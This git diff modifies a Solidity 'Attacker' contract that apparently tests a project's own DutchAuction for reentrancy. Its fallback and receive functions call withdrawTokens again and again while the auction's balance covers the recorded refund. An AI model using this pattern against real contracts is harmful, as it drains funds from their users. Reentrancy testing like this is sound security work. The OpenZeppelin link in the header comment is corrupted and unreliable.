@@ -9,9 +9,11 @@ Documentation:
 https://docs.openzeppelin.com/cGLDToken.balanceOfontracts/2.x/erc20
 */
 import "../contracts/DutchAuction.sol";
+import "hardhat/console.sol";
 
 contract Attacker{
     DutchAuction private dutchAuction; 
+    uint256 private refund;
     constructor(address _dutchAuctionAddress) {
         dutchAuction = DutchAuction(_dutchAuctionAddress);
     }
@@ -20,20 +22,27 @@ contract Attacker{
         dutchAuction.placeBid{value : msg.value}();
     }
 
+    function getRefund() external view returns (uint256){
+        return dutchAuction.getRefund();
+    }
+
     function attack() external{
+        refund = dutchAuction.getRefund();
         dutchAuction.withdrawTokens();
     }
 
-    fallback() external payable {
-        if (address(dutchAuction).balance >= 1 wei) {
+    function _internalAttackLogic() private {
+        if (address(dutchAuction).balance >= refund) {
             dutchAuction.withdrawTokens();
         }
     }
 
+    fallback() external payable {
+       _internalAttackLogic();
+    }
+
     receive() external payable{
-        if (address(dutchAuction).balance >= 1 wei) {
-            dutchAuction.withdrawTokens();
-        }
+        _internalAttackLogic();
     }
 }
 
